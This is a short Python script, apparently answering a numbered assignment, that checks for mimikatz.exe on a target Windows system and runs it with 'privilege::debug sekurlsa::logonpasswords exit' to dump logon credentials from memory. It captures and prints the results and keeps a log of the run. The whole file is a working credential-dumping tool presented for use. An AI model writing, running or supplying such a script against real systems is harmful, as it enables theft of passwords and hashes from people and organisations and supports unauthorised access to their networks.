import os
import subprocess

def check_mimikatz_path(mimikatz_path):
    """
    Task 2: Check if Mimikatz exists at the path provided.
    Returns True if found, False otherwise.
    """
    if os.path.exists(mimikatz_path):
        print(f"[+] Mimikatz found at: {mimikatz_path}")
        return True
    else:
        print(f"[-] Error: Mimikatz not found at {mimikatz_path}")
        return False

def run_mimikatz_command(mimikatz_path, command):
    """
    Task 2 & 3: Execute a Mimikatz command and return the output.
    Uses the subprocess module to capture output and handle text encoding.
    """
    try:
        process = subprocess.run(
            [mimikatz_path, command],
            capture_output=True,
            text=True
        )
        return process.stdout
    except Exception as e:
        print(f"Error running Mimikatz: {e}")
        return None

def log_execution(details):
    """
    Task 5: Log script execution for auditing purposes.
    Appends details to a log file to maintain an audit trail.
    """
    with open("mimikatz_log.txt", "a") as log_file:
        log_file.write(details + "\n")

def main():
    # Task 1 & 7: Locate and verify Mimikatz
    # Update this path to the actual location of mimikatz.exe on the target system
    mimikatz_path = "C:\\tools\\mimikatz.exe"  

    if check_mimikatz_path(mimikatz_path):
        # Task 4: Define commands to dump credentials
        mimikatz_command = "privilege::debug sekurlsa::logonpasswords exit"
        print(f"[*] Executing Mimikatz command: {mimikatz_command}")

        # Task 5: Log execution details before printing output
        log_execution(f"Executed command: {mimikatz_command}")

        output = run_mimikatz_command(mimikatz_path, mimikatz_command)
        
        if output:
            # Task 4: Display the captured output
            print("[+] Mimikatz Output Captured Successfully:")
            print(output)
        else:
            print("[-] Failed to execute Mimikatz command.")

if __name__ == "__main__":
    main()